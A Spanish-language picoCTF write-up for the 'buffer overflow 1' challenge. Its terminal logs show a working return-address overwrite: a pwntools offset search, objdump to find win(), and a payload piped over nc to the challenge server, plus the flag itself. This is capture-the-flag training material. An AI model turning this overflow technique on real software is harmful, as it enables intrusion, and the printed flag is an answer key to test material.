# buffer overflow 1
#picoCTF 
## Descripción
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln). You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using `nc saturn.picoctf.net 49413`

## Pistas 
+ (None)

## Solución
``` bash 
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation]
└─$ mkdir bufferoverflow1
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation]
└─$ cd bufferoverflow1  
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ wgethttps://artifacts.picoctf.net/c/187/vuln   
zsh: no such file or directory: wgethttps://artifacts.picoctf.net/c/187/vuln
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/187/vuln  
--2023-05-20 20:45:16--  https://artifacts.picoctf.net/c/187/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.17, 13.249.74.69, 13.249.74.22, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.17|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15704 (15K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[==============================================>]  15.34K  --.-KB/s    in 0s      

2023-05-20 20:45:16 (105 MB/s) - ‘vuln’ saved [15704/15704]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ wget https://artifacts.picoctf.net/c/187/vuln.c
--2023-05-20 20:45:24--  https://artifacts.picoctf.net/c/187/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.17, 13.249.74.69, 13.249.74.22, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.17|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 769 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                       100%[==============================================>]     769  --.-KB/s    in 0s      

2023-05-20 20:45:24 (25.5 MB/s) - ‘vuln.c’ saved [769/769]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ ls
vuln  vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ chmod +x vuln     
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ ./vuln
Please enter your string: 
dasdasdasdadasda
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' |nc saturn.picoctf.net 49413
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ 

```
``` bash 
┌──(kali㉿kali)-[~]
└─$ cd picoctf/BinaryExplotation/bufferoverflow1
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ python3 -c 'from pwn import *'
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ python3                       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 
```
``` bash
┌──(kali㉿kali)-[~]
└─$ cd picoctf/BinaryExplotation/bufferoverflow1
                                                         
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ objdump -D veuln -M intel | grep 'win'       
objdump: 'veuln': No such file
                                                         
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ objdump -D vuln -M intel | grep 'win' 
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                         
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/bufferoverflow1]
└─$ 

```
## Bandera
picoCTF{addr3ss3s_ar3_3asy_0195a40f}

## Notas adicionales
| comando | descripción |
|------------|---------------|
| xx | xx |

## Referencias
